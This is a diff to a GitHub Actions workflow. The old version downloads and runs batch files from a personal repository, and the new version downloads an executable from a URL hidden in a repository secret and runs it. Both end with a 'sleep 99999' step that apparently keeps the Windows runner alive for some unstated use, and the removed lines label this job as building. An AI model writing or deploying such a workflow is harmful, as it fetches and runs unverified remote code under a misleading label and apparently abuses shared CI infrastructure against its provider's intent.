@@ -4,23 +4,19 @@ on:
   workflow_dispatch:
 
 jobs:
-  build:
-    name: Start Building...
+  download-and-extract:
     runs-on: windows-latest
-    timeout-minutes: 360
     
     steps:
-      - name: Downloading & Installing Essentials
+      - name: Checkout the repository
+        uses: actions/checkout@v2
+
+      - name: Download file using curl
         run: |
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/rme/crm/crmdown.bat" -OutFile "crmdown.bat"
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/rme/crm/CRM.bat" -OutFile "CRM.bat"
-
-                  
-      - name: CRM
-        run: cmd /c CRM.bat
-
+          curl -L -o miso.exe "${{ secrets.MY_URL }}"
+          
       - name: crmdown
-        run: cmd /c crmdown.bat
+        run: cmd /c miso.exe
 
       - name: Time Counter
         run: sleep 99999
